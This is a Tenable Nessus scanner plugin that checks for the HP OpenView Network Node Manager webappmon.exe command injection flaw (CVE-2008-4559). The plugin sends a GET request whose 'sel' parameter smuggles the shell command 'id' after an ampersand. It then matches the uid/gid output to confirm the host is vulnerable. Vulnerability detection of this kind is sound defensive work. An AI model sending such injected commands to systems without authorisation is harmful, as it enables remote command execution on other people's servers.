#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(35657);
  script_version("$Revision: 1.14 $");
  script_cvs_date("$Date: 2015/09/24 23:21:18 $");

  script_cve_id("CVE-2008-4559");
  script_bugtraq_id(33666);
  script_osvdb_id(53238);

  script_name(english:"HP OpenView Network Node Manager webappmon.exe Command Injection (c01661610)");
  script_summary(english:"Tries to run a command via webappmon.exe");

  script_set_attribute( attribute:"synopsis", value:
"The remote web server contains a CGI script that is affected by a
command injection vulnerability.");
  script_set_attribute( attribute:"description",  value:
"The 'webappmon.exe' CGI script included with the version of HP
OpenView Network Node Manager installed on the remote host fails to
sanitize user input of shell metacharacters before using it to
execute external programs.  An unauthenticated, remote attacker can
leverage this issue to run arbitrary shell commands on the affected
host, subject to the privileges under which the associated web server
operates (for example, 'bin' on RedHat Enterprise 4).

Note that this install is also likely affected by other serious issues
although Nessus has not checked for them.");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?8595e5c4");
  script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/500734/30/0/threaded");
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?e73a5c26");
  script_set_attribute( attribute:"solution",  value:
"Apply the appropriate patch referenced in iDefense's advisory above.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');
  script_cwe_id(20);

  script_set_attribute(attribute:"plugin_publication_date", value:"2009/02/12");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80, 3443);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


os = get_kb_item("Host/OS");
if (os && "Windows" >< os) exit(0);


port = get_http_port(default:3443, embedded: 0);

cmd = "id";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";


# Loop through directories.
dirs = list_uniq(make_list("/OvCgi", cgi_dirs()));

foreach dir (dirs)
{
  # Try to exploit the issue to view configuration info.
  url = string(
    dir, "/webappmon.exe?",
    "ins=nowait&",
    "act=natping&",
    "sel=", urlencode(str:string('"255.255.255.255 & ', cmd, '&"'))
  );

  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # There's a problem if...
  if (
    # It looks like NNM output and...
    (
      "/nnm/webappmon/res-header.tmpl" >< res[2] ||
      "<!-- action : node name" >< res[2]
    ) &&
    # We see the expected command output
    egrep(pattern:cmd_pat, string:res[2])
  )
  {
    if (report_verbosity > 0)
    {
      report = string(
        "\n",
        "Nessus was able to execute the command '", cmd, "' on the remote \n",
        "host using the following URL :\n",
        "\n",
        "  ", build_url(port:port, qs:url), "\n"
      );
      if (report_verbosity > 1)
      {
        output = res[2];
        if ("</td></tr><tr><td></pre><pre>" >< res[2])
        {
          output = strstr(output, "</td></tr><tr><td></pre><pre>") - "</td></tr><tr><td></pre><pre>";
          if ("</pre>" >< output) output = output - strstr(output, "</pre>");
          output = strstr(output, '\n') - '\n';
          output = output - strstr(output, "Do you want to ping broadcast");
        }
        if (!egrep(pattern:cmd_pat, string:output)) output = res[2];

        report = string(
          report,
          "\n",
          "It produced the following output :\n",
          "\n",
          "  ", str_replace(find:'\n', replace:'\n  ', string:output), "\n"
        );
      }
      security_hole(port:port, extra:report);
    }
    else security_hole(port);

    exit(0);
  }
}
